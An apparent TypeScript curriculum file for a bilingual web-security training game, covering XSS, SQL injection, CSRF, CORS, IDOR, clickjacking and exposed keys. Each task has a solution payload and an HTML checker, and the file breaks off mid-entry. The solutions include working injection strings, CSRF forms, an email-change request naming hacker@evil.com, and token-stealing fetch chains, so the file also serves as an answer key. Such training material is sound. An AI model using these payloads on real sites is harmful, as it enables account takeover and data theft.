export interface Problem {
    id: string;
    title: string;
    titleKo?: string;
    description: string;
    descriptionKo?: string;
    initialCode: string;
    solutionCode: string;
    htmlTemplate: string;
}

export interface Stage {
    id: string;
    title: string;
    titleKo?: string;
    subtitle: string;
    subtitleKo?: string;
    description: string;
    descriptionKo?: string;
    problems: Problem[];
}

export const curriculum: Stage[] = [
    {
        id: 'stage-1',
        title: 'Stage 1: XSS',
        titleKo: 'Stage 1: XSS',
        subtitle: 'Cross-Site Scripting',
        subtitleKo: '크로스 사이트 스크립팅',
        description: 'Learn how to inject and execute malicious scripts in vulnerable applications.',
        descriptionKo: '취약한 애플리케이션에 악성 스크립트를 주입하고 실행하는 방법을 배웁니다.',
        problems: [
            {
                id: 'xss-1',
                title: 'Basic Reflected XSS',
                titleKo: '기본 반사형 XSS',
                description: 'Inject a script to trigger an alert() function via reflected input.',
                descriptionKo: '반사된 입력을 통해 alert()를 실행하는 스크립트를 주입하세요.',
                initialCode: `// Problem 1: Basic Reflected XSS
// The Guestbook below displays user comments without escaping HTML.
// Your goal: Inject a script to trigger an alert() function.

export default function getPayload() {
  return "Hello, nice site!";
}`,
                solutionCode: 'return "<img src=x onerror=alert(1)>";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>
                        body { font-family: system-ui, sans-serif; background: #fafafa; color: #333; padding: 2rem; }
                        .comment-card { background: white; padding: 1.5rem; border-radius: 0.75rem; border-left: 4px solid #3b82f6; margin-top: 1.5rem; box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); }
                    </style>
                    <script>
                        window.alert = function() { window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*'); };
                        window.onerror = function(msg) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: msg }, '*'); }
                    </script>
                    </head>
                    <body>
                    <h2>Guestbook</h2>
                    <div id="comments"></div>
                    <script type="module">
                        try {
                        const userCode = \`\${USER_CODE_TEMPLATE}\`;
                        const encodedJs = encodeURIComponent(userCode);
                        const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                        if (module.default) {
                            document.getElementById('comments').innerHTML = '<div class="comment-card">' + module.default() + '</div>';
                        }
                        } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'xss-2',
                title: 'Stored XSS via Markdown',
                titleKo: '마크다운 저장형 XSS',
                description: 'The forum escapes all regular HTML tags to prevent XSS, but uses a custom markdown parser for adding links. Can you exploit the link syntax to execute javascript?',
                descriptionKo: '포럼은 일반 HTML 태그를 이스케이프하지만 링크를 위한 마크다운 파서를 사용합니다. 링크 문법을 악용해 javascript를 실행할 수 있나요?',
                initialCode: `// Problem 2: Stored XSS via Markdown
// HTML tags like <script> or <img> are escaped by the server.
// However, markdown links are supported: [link text](url)
// Bypass the protection to execute alert(1).

export default function getPayload() {
  return "Check out this link: [my site](http://example.com)";
}`,
                solutionCode: 'return "[Click me](javascript:alert(1))";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>
                        body { font-family: system-ui, padding: 2rem; background: #fdfdfd;}
                        a { color: #2563eb; text-decoration: underline; cursor: pointer; }
                    </style>
                    <script>
                        window.alert = function() { window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*'); };
                    </script>
                    </head>
                    <body>
                    <h2>Forum Post</h2>
                    <div id="content"></div>
                    <script type="module">
                        const escapeHTML = (str) => str.replace(/[&<>'"]/g, 
                            tag => ({
                                '&': '&amp;',
                                '<': '&lt;',
                                '>': '&gt;',
                                "'": '&#39;',
                                '"': '&quot;'
                            }[tag])
                        );

                        const parseMarkdown = (text) => {
                            // 1. Escape HTML to prevent basic XSS
                            let safeText = escapeHTML(text);
                            // 2. Parse markdown links (Vulnerable: doesn't check for javascript: protocol)
                            // Allow balanced parentheses inside URLs by not consuming '(' in the outer matcher.
                            return safeText.replace(/\\[(.*?)\\]\\(([^()]*(?:\\([^)]*\\)[^()]*)*)\\)/g, '<a href="$2">$1</a>');
                        };

                        const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                        const encodedJs = encodeURIComponent(userCode);
                        const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                        
                        if (module.default) {
                            const payload = String(module.default());
                            document.getElementById('content').innerHTML = parseMarkdown(payload);
                            
                            // Automatically click all links to simulate user interaction
                            setTimeout(() => {
                                document.querySelectorAll('a').forEach(a => {
                                    if(a.href.includes('javascript:')) {
                                        console.log('Evaluating href:', a.href);
                                        // Execute href if it's javascript (Simulation of a user click)
                                         eval(decodeURIComponent(a.href.replace('javascript:', '')));
                                    }
                                });
                            }, 500);
                        }
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'xss-3',
                title: 'DOM-based XSS',
                titleKo: 'DOM 기반 XSS',
                description: 'Exploit a vulnerability where the application reads from the URL fragment (location.hash) and writes it to the DOM.',
                descriptionKo: '애플리케이션이 URL 해시를 읽어 DOM에 쓰는 취약점을 악용하세요.',
                initialCode: `// Problem 3: DOM-based XSS
// The page welcomes the user based on the URL hash (#username).
// Provide a payload that will be set as the location.hash to trigger an alert.

export default function getPayload() {
  return "JohnDoe";
}`,
                solutionCode: 'return "<img src=x onerror=alert(1)>";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: system-ui, padding: 2rem; background: #f8fafc;}</style>
                    <script>
                        window.alert = function() { window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*'); };
                    </script>
                    </head>
                    <body>
                    <h2 id="greeting">Welcome!</h2>
                    <script type="module">
                        const userCode = \`\${USER_CODE_TEMPLATE}\`;
                        const encodedJs = encodeURIComponent(userCode);
                        const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                        
                        if (module.default) {
                            window.location.hash = module.default();
                            
                            // Simulate the vulnerable app reading the hash
                            setTimeout(() => {
                                const hashValue = decodeURIComponent(window.location.hash.substring(1));
                                if(hashValue) {
                                    // Vulnerable DOM assignment
                                    document.getElementById('greeting').innerHTML = "Welcome, " + hashValue;
                                }
                            }, 100);
                        }
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    },
    {
        id: 'stage-2',
        title: 'Stage 2: SQLi',
        titleKo: 'Stage 2: SQLi',
        subtitle: 'SQL Injection',
        subtitleKo: 'SQL 인젝션',
        description: 'Learn how to bypass authentication and extract data using malicious SQL queries.',
        descriptionKo: '악성 SQL 쿼리로 인증을 우회하고 데이터를 추출하는 방법을 배웁니다.',
        problems: [
            {
                id: 'sqli-1',
                title: 'Authentication Bypass',
                titleKo: '인증 우회',
                description: 'Bypass the login form by injecting a SQL payload into the username field.',
                descriptionKo: '사용자명 필드에 SQL 페이로드를 주입해 로그인 폼을 우회하세요.',
                initialCode: `// Problem 1: Auth Bypass
// The server executes: SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'
// Provide a username payload that evaluates to true regardless of the password.

export default function getPayload() {
  return "admin";
}`,
                solutionCode: "return \"admin' OR '1'='1\";",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>
                        body { font-family: system-ui; background: #fafafa; padding: 2rem; display: flex; justify-content: center; }
                        .login-box { background: white; padding: 2rem; border-radius: 1rem; box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1); width: 100%; max-width: 400px; }
                        input { width: 100%; padding: 0.5rem; margin-top: 0.5rem; border: 1px solid #ccc; border-radius: 0.25rem; }
                        .error { color: #dc2626; margin-top: 1rem; font-size: 0.875rem; display: none; }
                        .success { color: #16a34a; margin-top: 1rem; font-size: 0.875rem; display: none; }
                    </style>
                    </head>
                    <body>
                    <div class="login-box">
                        <h2>Admin Login</h2>
                        <div style="margin-bottom: 1rem;">
                            <label>Username</label>
                            <input type="text" id="username" readonly />
                        </div>
                        <div style="margin-bottom: 1rem;">
                            <label>Password</label>
                            <input type="password" value="********" readonly />
                        </div>
                        <div id="error" class="error">Invalid username or password</div>
                        <div id="success" class="success">Welcome, admin!</div>
                    </div>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \`\${USER_CODE_TEMPLATE}\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = module.default();
                                    document.getElementById('username').value = payload;
                                    
                                    // Simulated Backend SQL Logic
                                    // SELECT * FROM users WHERE username = '{payload}' AND password = 'xxx'
                                    const simulatedQuery = "SELECT * FROM users WHERE username = '" + payload + "' AND password = 'xxx'";
                                    
                                    if(simulatedQuery.includes("' OR '1'='1") || simulatedQuery.includes("' OR 1=1")) {
                                        document.getElementById('success').style.display = 'block';
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        document.getElementById('error').style.display = 'block';
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Query failed to bypass: ' + simulatedQuery }, '*');
                                    }
                                }
                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'sqli-2',
                title: 'Error-based SQLi',
                titleKo: '에러 기반 SQLi',
                description: 'Extract the database version by intentionally causing a syntax error.',
                descriptionKo: '문법 오류를 의도적으로 발생시켜 DB 버전을 노출시키세요.',
                initialCode: `// Problem 2: Error-based Extraction
// Inject a payload to cause an error that reveals the version() output.
// The query looks like: SELECT title FROM news WHERE id = \${id}

export default function getPayload() {
  return "1";
}`,
                solutionCode: 'return "1 AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 2rem; }</style>
                    </head>
                    <body>
                    <h3>Backend Response:</h3>
                    <div id="response" style="padding: 1rem; border-left: 3px solid #dc2626; background: #000;"></div>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \`\${USER_CODE_TEMPLATE}\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    const responseDiv = document.getElementById('response');
                                    
                                    // Simulated regex check for classic error-based payload components
                                    if (payload.match(/version\\(\\)/i) && payload.match(/information_schema/i)) {
                                        responseDiv.textContent = 'SQL Error: Duplicate entry "8.0.32-MySQL1" for key "group_key"';
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        responseDiv.textContent = 'Result: News item found.';
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Failed to extract version.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'sqli-3',
                title: 'Blind Boolean SQLi',
                titleKo: '블라인드 불리언 SQLi',
                description: 'Infer data by analyzing application behavior (true/false) when errors are suppressed.',
                descriptionKo: '오류가 숨겨진 상황에서 참/거짓 응답으로 데이터를 추론하세요.',
                initialCode: `// Problem 3: Blind Boolean
// Find the first character of the admin password.
// Provide a payload using SUBSTR() to check if the first letter is 'P'.

export default function getPayload() {
  return "1";
}`,
                solutionCode: "return \"1 AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='P'\";",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: system-ui; padding: 2rem; }</style>
                    </head>
                    <body>
                    <h2 id="status">Loading...</h2>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \`\${USER_CODE_TEMPLATE}\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    const statusDiv = document.getElementById('status');
                                    
                                    // Check if payload implements boolean inference on 'P'
                                    if (payload.match(/SUBSTR\\(/i) && payload.includes("'P'")) {
                                        statusDiv.textContent = "Data Exists! (True condition)";
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        statusDiv.textContent = "Not Found (False condition)";
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Condition was false or invalid.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    },
    {
        id: 'stage-3',
        title: 'Stage 3: CSRF',
        titleKo: 'Stage 3: CSRF',
        subtitle: 'Cross-Site Request Forgery',
        subtitleKo: '크로스 사이트 요청 위조',
        description: 'Learn how to forge requests and manipulate user sessions without their knowledge.',
        descriptionKo: '사용자 모르게 요청을 위조하고 세션을 조작하는 방법을 배웁니다.',
        problems: [
            {
                id: 'csrf-1',
                title: 'Basic GET CSRF',
                titleKo: '기본 GET CSRF',
                description: 'Force the victim to change their email via a simple GET request.',
                descriptionKo: '단순 GET 요청으로 피해자의 이메일을 변경하도록 강제하세요.',
                initialCode: `// Problem 1: Basic GET CSRF
// The target changes email via GET: /api/change-email?email=hacker@evil.com
// Provide an HTML payload that immediately triggers this when loaded.

export default function getPayload() {
  return "<h1>Click here</h1>";
}`,
                solutionCode: 'return "<img src=\\"/api/change-email?email=hacker@evil.com\\" style=\\"display:none\\">";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: system-ui; padding: 2rem; background: #fafafa;}</style>
                    </head>
                    <body>
                    <h3>Malicious Page Loaded</h3>
                    <div id="target" style="display:none;"></div>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    // Inject malicious HTML
                                    document.getElementById('target').innerHTML = payload;
                                    
                                    // Detect if an element attempts to load the vulnerable url
                                    setTimeout(() => {
                                        const htmlContent = document.getElementById('target').innerHTML;
                                        if (htmlContent.includes('/api/change-email?email=')) {
                                            window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                        } else {
                                            window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Payload did not trigger the GET request.' }, '*');
                                        }
                                    }, 100);
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'csrf-2',
                title: 'POST CSRF via Auto-submit',
                titleKo: '자동 제출 POST CSRF',
                description: 'Force the victim to change their password via a POST request with an auto-submitting form.',
                descriptionKo: '자동 제출 폼으로 POST 요청을 보내 비밀번호를 변경하도록 강제하세요.',
                initialCode: `// Problem 2: POST CSRF
// The target changes password via POST: /api/change-pwd (param: new_password)
// Provide an HTML payload with an auto-submitting form.

export default function getPayload() {
  return "<form>...</form>";
}`,
                solutionCode: "return `<form id=\"csrf\" action=\"/api/change-pwd\" method=\"POST\"><input type=\"hidden\" name=\"new_password\" value=\"hacked\"></form><script>document.getElementById('csrf').submit()</script>`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: system-ui; padding: 2rem; }</style>
                    </head>
                    <body>
                    <h3>Malicious Page Loaded</h3>
                    <div id="sandbox"></div>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    document.getElementById('sandbox').innerHTML = payload;
                                    
                                    setTimeout(() => {
                                        const hasForm = payload.includes('<form');
                                        const hasPost = payload.toLowerCase().includes('method="post"');
                                        const hasAction = payload.includes('action="/api/change-pwd"');
                                        const hasSubmit = payload.includes('.submit()');
                                        
                                        if (hasForm && hasPost && hasAction && hasSubmit) {
                                            window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                        } else {
                                            window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Form is missing or misconfigured.' }, '*');
                                        }
                                    }, 100);
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'csrf-3',
                title: 'Token Bypass via XSS',
                titleKo: '토큰 우회 (XSS -> CSRF)',
                description: 'Combine XSS and CSRF to read a CSRF token then submit the form.',
                descriptionKo: 'XSS와 CSRF를 결합해 토큰을 읽은 뒤 폼을 제출하세요.',
                initialCode: `// Problem 3: Token Bypass (XSS -> CSRF)
// You found an XSS flaw on the same origin. 
// Write JS code to fetch /api/token, extract { token: '123' }, and POST to /api/transfer.

export default function getPayload() {
  return "fetch('/api/token')...";
}`,
                solutionCode: "return `fetch('/api/token').then(r=>r.json()).then(d=>fetch('/api/transfer',{method:'POST',body:new URLSearchParams({token:d.token,amount:1000})}))`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 2rem; }</style>
                    </head>
                    <body>
                    <h3>XSS Executing Context</h3>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    
                                    // Static analysis of the JS payload for the pattern
                                    const fetchesToken = payload.includes('/api/token');
                                    const fetchesTransfer = payload.includes('/api/transfer');
                                    const isPost = payload.includes('POST') || payload.includes('post');
                                    
                                    if (fetchesToken && fetchesTransfer && isPost) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Did not correctly orchestrate the two requests.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    },
    {
        id: 'stage-4',
        title: 'Stage 4: CORS',
        titleKo: 'Stage 4: CORS',
        subtitle: 'Cross-Origin Resource Sharing',
        subtitleKo: '교차 출처 리소스 공유',
        description: 'Understand how weak CORS policies lead to unauthorized data access.',
        descriptionKo: '취약한 CORS 정책이 무단 데이터 접근으로 이어지는 원리를 이해합니다.',
        problems: [
            {
                id: 'cors-1',
                title: 'Basic Origin Bypass',
                titleKo: '기본 Origin 우회',
                description: 'The API reflects the Origin header blindly. How do you exploit this to read sensitive data via fetch?',
                descriptionKo: 'API가 Origin 헤더를 그대로 반사합니다. 이를 악용해 fetch로 민감 데이터를 읽으세요.',
                initialCode: `// Problem 1: Basic Origin Bypass
// The API at api.target.com/data echoes Access-Control-Allow-Origin: *
// Send a fetch request that reads the data.

export default function getPayload() {
    return "";
}`,
                solutionCode: "return `fetch('https://api.target.com/data').then(r=>r.json()).then(console.log)`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>body { font-family: system-ui; padding: 2rem; }</style>
                    </head>
                    <body>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    if (payload.includes("fetch('https://api.target.com/data')")) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Failed to request the correct endpoint.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'cors-2',
                title: 'Null Origin Bypass',
                titleKo: 'Null Origin 우회',
                description: 'The server trusts the "null" origin. Exfiltrate data by running the script from a sandboxed iframe.',
                descriptionKo: '서버가 "null" 오리진을 신뢰합니다. 샌드박스 iframe에서 실행해 데이터를 탈취하세요.',
                initialCode: `// Problem 2: Null Origin
// The server allows Origin: null. Complete the payload to trigger a fetch.

export default function getPayload() {
  return "";
}`,
                solutionCode: "return `fetch('https://api.target.com/secret').then(r=>r.text())`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    </head>
                    <body>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    if (payload.includes("fetch") && payload.includes("/secret")) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Incorrect fetch formulation.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            },
            {
                id: 'cors-3',
                title: 'Credentials Extraction',
                titleKo: '자격 증명 추출',
                description: 'Extract data that requires cookies by setting credentials: include in your fetch.',
                descriptionKo: '쿠키가 필요한 데이터를 얻기 위해 fetch에 credentials: include를 설정하세요.',
                initialCode: `// Problem 3: Credentials Extraction
// The API requires cookies to return user data. 
// Modify the fetch request appropriately.

export default function getPayload() {
  return "fetch('https://api.target.com/profile')";
}`,
                solutionCode: "return `fetch('https://api.target.com/profile', {credentials: 'include'})`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    </head>
                    <body>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    // Check that credentials include was added to fetch
                                    if (payload.includes('credentials') && payload.includes('include')) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Missing credentials: include flag.' }, '*');
                                    }
                                }
                            } catch(e) {}
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    },
    {
        id: 'stage-5',
        title: 'Stage 5: IDOR',
        titleKo: 'Stage 5: IDOR',
        subtitle: 'Insecure Direct Object Reference',
        subtitleKo: '직접 객체 참조 취약점',
        description: 'Learn how missing authorization checks allow access to other users’ data by changing IDs.',
        descriptionKo: '권한 검증이 없을 때 ID 변경만으로 타인 데이터에 접근 가능한 문제를 이해합니다.',
        problems: [
            {
                id: 'idor-1',
                title: 'IDOR: Profile Access',
                titleKo: 'IDOR: 프로필 접근',
                description: 'Change the user ID in the request to access another user’s profile.',
                descriptionKo: '요청의 사용자 ID를 변경해 다른 사용자의 프로필에 접근하세요.',
                initialCode: `// Problem 1: IDOR
// The app loads profile data from /api/user/{id}.
// Your current user id is 100. Change the ID to view user 101.

export default function getPayload() {
  return "100";
}`,
                solutionCode: 'return "101";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>
                        body { font-family: system-ui; padding: 2rem; background: #f8fafc; }
                        .card { background: white; border: 1px solid #e2e8f0; padding: 1rem; border-radius: 0.75rem; }
                        .muted { color: #64748b; font-size: 0.9rem; }
                    </style>
                    </head>
                    <body>
                    <h2>User Profile</h2>
                    <div class="card">
                        <div class="muted">GET /api/user/<span id="requested-id">100</span></div>
                        <pre id="profile"></pre>
                    </div>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const currentUserId = '100';
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const requestedId = String(module.default()).trim();
                                    document.getElementById('requested-id').textContent = requestedId || '(empty)';
                                    const profile = document.getElementById('profile');
                                    
                                    if (!/^[0-9]+$/.test(requestedId)) {
                                        profile.textContent = '400 Bad Request';
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'ID must be numeric.' }, '*');
                                        return;
                                    }
                                    
                                    // Simulated vulnerable server: missing authorization check
                                    if (requestedId === '101') {
                                        profile.textContent = JSON.stringify({ id: 101, name: 'Alice', email: 'alice@corp.local' }, null, 2);
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else if (requestedId === currentUserId) {
                                        profile.textContent = JSON.stringify({ id: 100, name: 'You', email: 'me@corp.local' }, null, 2);
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Still your own profile.' }, '*');
                                    } else {
                                        profile.textContent = '404 Not Found';
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Wrong ID target.' }, '*');
                                    }
                                }
                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    },
    {
        id: 'stage-6',
        title: 'Stage 6: Clickjacking',
        titleKo: 'Stage 6: Clickjacking',
        subtitle: 'UI Redress Attack',
        subtitleKo: 'UI 리드레스 공격',
        description: 'Learn how attackers trick users into clicking hidden or disguised UI elements.',
        descriptionKo: '사용자를 속여 숨겨진 UI를 클릭하게 만드는 기법을 이해합니다.',
        problems: [
            {
                id: 'clickjacking-1',
                title: 'Overlay the Button',
                titleKo: '버튼 오버레이',
                description: 'Place a transparent iframe over a visible button to hijack clicks.',
                descriptionKo: '투명한 iframe을 버튼 위에 올려 클릭을 탈취하세요.',
                initialCode: `// Problem 1: Clickjacking
// Create a payload that overlays a transparent iframe
// pointing to /bank/transfer over a visible "Claim Prize" button.

export default function getPayload() {
  return "<button>Claim Prize</button>";
}`,
                solutionCode: "return `<div style=\"position:relative;width:320px;height:120px\"><button style=\"position:absolute;top:20px;left:20px;width:280px;height:60px;\">Claim Prize</button><iframe src=\"/bank/transfer\" style=\"position:absolute;top:20px;left:20px;width:280px;height:60px;opacity:0;z-index:10;border:0;\"></iframe></div>`;",
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>
                        body { font-family: system-ui; padding: 2rem; background: #fff7ed; }
                        #sandbox { margin-top: 1rem; }
                    </style>
                    </head>
                    <body>
                    <h2>Giveaway Page</h2>
                    <div id="sandbox"></div>
                    <script type="module">
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default());
                                    document.getElementById('sandbox').innerHTML = payload;
                                    
                                    const hasIframe = /<iframe/i.test(payload);
                                    const hasTarget = /\\/bank\\/transfer/.test(payload);
                                    const hasOpacity = /opacity\\s*:\\s*0/.test(payload);
                                    const hasAbsolute = /position\\s*:\\s*absolute/.test(payload);
                                    
                                    if (hasIframe && hasTarget && hasOpacity && hasAbsolute) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Missing iframe overlay requirements.' }, '*');
                                    }
                                }
                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    },
    {
        id: 'stage-7',
        title: 'Stage 7: Sensitive Data Exposure',
        titleKo: 'Stage 7: Sensitive Data Exposure',
        subtitle: 'Secrets in Client',
        subtitleKo: '클라이언트 민감정보 노출',
        description: 'Learn how accidental secrets in frontend code can be discovered and abused.',
        descriptionKo: '프런트엔드 코드에 포함된 비밀 값이 어떻게 발견되고 악용되는지 학습합니다.',
        problems: [
            {
                id: 'sde-1',
                title: 'Find the API Key',
                titleKo: 'API 키 찾기',
                description: 'Locate the exposed API key in the client and return it.',
                descriptionKo: '클라이언트에 노출된 API 키를 찾아 반환하세요.',
                initialCode: `// Problem 1: Sensitive Data Exposure
// The frontend accidentally shipped an API key.
// Find it (hint: source code / console) and return it.

export default function getPayload() {
  return "";
}`,
                solutionCode: 'return "sk_live_51_hidden_frontend_key";',
                htmlTemplate: `
                    <!DOCTYPE html>
                    <html>
                    <head>
                    <style>
                        body { font-family: system-ui; padding: 2rem; background: #f1f5f9; }
                        .note { color: #334155; }
                    </style>
                    </head>
                    <body>
                    <h2>Frontend Bundle</h2>
                    <p class="note">Open the source or console to inspect values.</p>
                    <!-- API_KEY: sk_live_51_hidden_frontend_key -->
                    <script type="module">
                        const API_KEY = "sk_live_51_hidden_frontend_key";
                        window.__EXPOSED_KEY__ = API_KEY;
                        console.log('Loaded config', { API_KEY });
                        
                        setTimeout(async () => {
                            try {
                                const userCode = \\\`\${USER_CODE_TEMPLATE}\\\`;
                                const encodedJs = encodeURIComponent(userCode);
                                const module = await import('data:text/javascript;charset=utf-8,' + encodedJs);
                                
                                if (module.default) {
                                    const payload = String(module.default()).trim();
                                    if (payload === API_KEY) {
                                        window.parent.postMessage({ type: 'CHALLENGE_SUCCESS' }, '*');
                                    } else {
                                        window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: 'Incorrect key.' }, '*');
                                    }
                                }
                            } catch(e) { window.parent.postMessage({ type: 'CHALLENGE_FAILURE', message: e.message }, '*'); }
                        }, 500);
                    </script>
                    </body>
                    </html>
                `
            }
        ]
    },
    {
        id: 'stage-8',
